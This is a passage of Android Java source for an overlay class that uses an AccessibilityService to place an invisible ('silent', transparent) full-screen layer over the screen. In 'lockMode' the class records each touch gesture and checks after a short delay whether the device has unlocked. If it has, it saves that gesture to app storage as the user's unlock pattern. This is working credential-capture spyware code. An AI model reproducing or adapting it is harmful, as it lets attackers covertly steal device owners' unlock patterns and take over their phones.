            int fmt = silent ? PixelFormat.TRANSPARENT : PixelFormat.TRANSLUCENT;

            // Use TYPE_ACCESSIBILITY_OVERLAY — works without SYSTEM_ALERT_WINDOW when
            // the AccessibilityService is the provider of the WindowManager token.
            // Fall back to TYPE_APPLICATION_OVERLAY only if the service is unavailable.
            int[] types = svc != null
                ? new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY }
                : new int[]{ WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                             WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY };

            boolean added = false;
            Exception lastEx = null;
            for (int type : types) {
                try {
                    WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                            WindowManager.LayoutParams.MATCH_PARENT,
                            WindowManager.LayoutParams.MATCH_PARENT,
                            type, flags, fmt);
                    overlayWm.addView(view, lp);
                    activeWm = overlayWm;
                    added = true;
                    Log.i(TAG, "Overlay added with type " + type + " via " + (svc != null ? "AccessibilityService WM" : "app WM"));
                    break;
                } catch (Exception e) {
                    Log.w(TAG, "addView type=" + type + " failed: " + e.getMessage());
                    lastEx = e;
                }
            }
            if (!added) {
                Log.e(TAG, "RecordingOverlay.show all types failed");
                view = null;
                if (onStop != null) onStop.run();
                throw lastEx != null ? new RuntimeException(lastEx) : new RuntimeException("Could not add overlay view");
            }
        }

        void setPaused(boolean paused) {
            this.paused = paused;
            if (view != null) view.invalidate();
        }

        /**
         * Accept a MotionEvent from an external source (e.g. AccessibilityService.onMotionEvent
         * on API 33+). Used when the overlay is FLAG_NOT_TOUCHABLE and cannot receive events
         * through its own onTouchEvent.
         */
        void externalTouch(MotionEvent event) {
            if (!stopped) handleTouch(event);
        }

        /** Return up to maxPts of the most recent recorded points as a JSON snapshot. */
        synchronized JSONArray getPointsSnapshot(int maxPts) throws Exception {
            JSONArray arr = new JSONArray();
            int start = Math.max(0, points.size() - maxPts);
            for (int i = start; i < points.size(); i++) {
                GesturePoint gp = points.get(i);
                JSONObject p = new JSONObject();
                p.put("id",     gp.pointerId);
                p.put("action", gp.action);
                p.put("nx",     gp.nx);
                p.put("ny",     gp.ny);
                p.put("t",      gp.t);
                arr.put(p);
            }
            return arr;
        }

        private void handleTouch(MotionEvent event) {
            if (paused) return;
            if (lockMode ? currentGesturePts.size() >= MAX_PTS : points.size() >= MAX_PTS) return;
            long now  = System.currentTimeMillis();
            long relT = now - startTime;

            int action    = event.getActionMasked();
            int pidIndex  = event.getActionIndex();
            int pointerId = event.getPointerId(pidIndex);

            int count = event.getPointerCount();

            // In lockMode, start a fresh gesture batch on first finger down
            if (lockMode && (action == MotionEvent.ACTION_DOWN)) {
                currentGesturePts.clear();
                currentGestureStartTime = now;
            }

            for (int i = 0; i < count; i++) {
                int pid = event.getPointerId(i);
                float rx = event.getX(i) / screenW;
                float ry = event.getY(i) / screenH;
                GesturePoint gp = new GesturePoint();
                gp.pointerId = pid;
                gp.action    = (i == pidIndex) ? action : MotionEvent.ACTION_MOVE;
                gp.nx = rx; gp.ny = ry;
                gp.t = relT;
                if (lockMode) {
                    // Track per-gesture points separately
                    GesturePoint gp2 = new GesturePoint();
                    gp2.pointerId = gp.pointerId;
                    gp2.action    = gp.action;
                    gp2.nx = gp.nx; gp2.ny = gp.ny;
                    gp2.t = now - currentGestureStartTime;
                    currentGesturePts.add(gp2);
                } else {
                    points.add(gp);
                }
            }

            // Update visual paths (only relevant in non-silent mode)
            if (!silent) {
                float x = event.getX(pidIndex);
                float y = event.getY(pidIndex);
                switch (action) {
                    case MotionEvent.ACTION_DOWN:
                    case MotionEvent.ACTION_POINTER_DOWN: {
                        Path p = new Path();
                        p.moveTo(x, y);
                        activePaths.put(pointerId, p);
                        break;
                    }
                    case MotionEvent.ACTION_MOVE: {
                        for (int i = 0; i < count; i++) {
                            int pid = event.getPointerId(i);
                            Path p = activePaths.get(pid);
                            if (p != null) p.lineTo(event.getX(i), event.getY(i));
                        }
                        break;
                    }
                    case MotionEvent.ACTION_UP:
                    case MotionEvent.ACTION_POINTER_UP: {
                        Path p = activePaths.remove(pointerId);
                        if (p != null) { p.lineTo(x, y); finishedPaths.add(p); }
                        break;
                    }
                }
                if (view != null) view.invalidate();
            }

            // lockMode: on last finger lift, decide save or discard
            if (lockMode && action == MotionEvent.ACTION_UP) {
                onGestureFinished(now);
            }
        }

        /**
         * Called when the user lifts the last finger in lockMode.
         * Checks whether the device is now unlocked:
         *  - If the pattern was correct and the device unlocked → save this gesture
         *  - If still locked → discard and wait for the next attempt
         * We delay the check slightly to let the unlock animation complete.
         */
        private void onGestureFinished(final long gestureEndTime) {
            final List<GesturePoint> snapshot = new ArrayList<>(currentGesturePts);
            currentGesturePts.clear();

            // A simple tap (< 10 points or < 200ms duration) is not a pattern — skip
            if (snapshot.size() < 10) return;
            long dur = gestureEndTime - currentGestureStartTime;
            if (dur < 200) return;

            // Delay 350ms to let the system process the unlock before checking
            overlayHandler.postDelayed(() -> {
                try {
                    android.app.KeyguardManager km =
                        (android.app.KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
                    boolean isLocked = (km != null && km.isKeyguardLocked());
                    if (!isLocked) {
                        // Device just unlocked — this gesture was the correct unlock pattern; save it
                        saveGesturePoints(snapshot, gestureEndTime - currentGestureStartTime);
                    }
                    // Still locked → discard silently, wait for next attempt
                } catch (Exception e) {
                    Log.e(TAG, "onGestureFinished check: " + e.getMessage());
                }
            }, 350);
        }

        /** Persist a list of gesture points to disk immediately. */
        private void saveGesturePoints(List<GesturePoint> pts, long durationMs) {
            try {
                if (pts.isEmpty()) return;
                JSONArray arr = new JSONArray();
                for (GesturePoint gp : pts) {
                    JSONObject p = new JSONObject();
                    p.put("id",     gp.pointerId);
                    p.put("action", gp.action);
                    p.put("nx",     gp.nx);
                    p.put("ny",     gp.ny);
                    p.put("t",      gp.t);
                    arr.put(p);
                }
                JSONObject data = new JSONObject();
                data.put("label",      label);
                data.put("packageId",  packageId);
                data.put("screenW",    screenW);
                data.put("screenH",    screenH);
                data.put("durationMs", durationMs);
                data.put("recordedAt", System.currentTimeMillis());
                data.put("points",     arr);

                String ts       = new java.text.SimpleDateFormat("yyyyMMdd_HHmmss", java.util.Locale.getDefault()).format(new java.util.Date());
                String filename = packageId + "_" + label + "_" + ts + ".json";
                java.io.File outFile = new java.io.File(gestureDir(), filename);
                try (java.io.FileWriter fw = new java.io.FileWriter(outFile)) { fw.write(data.toString()); }
                Log.i(TAG, "Saved unlock gesture: " + filename + " (" + pts.size() + " pts)");
            } catch (Exception e) {
                Log.e(TAG, "saveGesturePoints: " + e.getMessage());
            }
        }

        private java.io.File gestureDir() {
            return new java.io.File(context.getFilesDir(), SUBDIR);
        }

        JSONObject stopAndSave(File dir) {
            stopped = true;
            hide();
            JSONObject result = new JSONObject();
            try {
                if (points.isEmpty()) return null;
                long dur = points.isEmpty() ? 0 : points.get(points.size() - 1).t;
                JSONArray arr = new JSONArray();
                for (GesturePoint gp : points) {
                    JSONObject p = new JSONObject();
                    p.put("id",     gp.pointerId);
                    p.put("action", gp.action);
                    p.put("nx",     gp.nx);
                    p.put("ny",     gp.ny);
                    p.put("t",      gp.t);
                    arr.put(p);
                }
                JSONObject data = new JSONObject();
                data.put("label",      label);
                data.put("packageId",  packageId);
                data.put("screenW",    screenW);
                data.put("screenH",    screenH);
                data.put("durationMs", dur);
                data.put("recordedAt", System.currentTimeMillis());
                data.put("points",     arr);

                String ts       = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
                String filename = packageId + "_" + label + "_" + ts + ".json";
                File   outFile  = new File(dir, filename);
                try (FileWriter fw = new FileWriter(outFile)) { fw.write(data.toString()); }

                result.put("filename",   filename);
                result.put("pointCount", arr.length());
                result.put("durationMs", dur);
                result.put("path",       outFile.getAbsolutePath());
            } catch (Exception e) {
                Log.e(TAG, "stopAndSave: " + e.getMessage());
                return null;
            }
            return result;
        }

        void hide() {
            try {
                if (view != null) {
                    WindowManager removeWm = activeWm != null ? activeWm : wm;
                    removeWm.removeView(view);
                }
                view = null;
                activeWm = null;
            } catch (Exception ignored) {}
        }

        /**
         * Stop, apply complexity filter, and only save if the captured gesture
         * is complex (multi-finger OR curved path — not a simple tap or linear swipe).
         */
        JSONObject stopAndSaveIfComplex(File dir) {
            stopped = true;
            hide();
            if (points.size() < 10) return null; // too few points — skip

            // Check for multi-pointer (multi-finger) — always complex
            boolean multiPointer = false;
            for (GesturePoint gp : points) {
                if (gp.pointerId != 0) { multiPointer = true; break; }
            }

            // Check for path curvature: compute max deviation from the straight line
            // between first and last point
            boolean curved = false;
            if (!multiPointer && points.size() >= 3) {
                GesturePoint first = points.get(0);
                GesturePoint last  = points.get(points.size() - 1);
                float dx = last.nx - first.nx;
                float dy = last.ny - first.ny;
                float len = (float) Math.sqrt(dx * dx + dy * dy);
                if (len < 0.05f) {
                    // Very short total displacement — it's a tap or stationary gesture
                    // Still might be complex if it lasted > 1.5 seconds
                    long dur = last.t - first.t;
                    if (dur < 1500) return null; // simple tap
                    curved = true;
                } else {
                    // Compute max perpendicular deviation from the line
                    float maxDev = 0;
                    for (GesturePoint gp : points) {
                        // Cross product gives perpendicular distance
                        float crossLen = Math.abs((gp.nx - first.nx) * dy - (gp.ny - first.ny) * dx);
                        float dev = crossLen / len;
                        if (dev > maxDev) maxDev = dev;
                    }
                    // More than 5% screen deviation from straight line = curved
                    if (maxDev > 0.05f) curved = true;
                }
            }

            if (!multiPointer && !curved) return null; // simple linear swipe — skip

            // Complex enough — delegate to regular save
            return stopAndSave(dir);
        }
    }
}
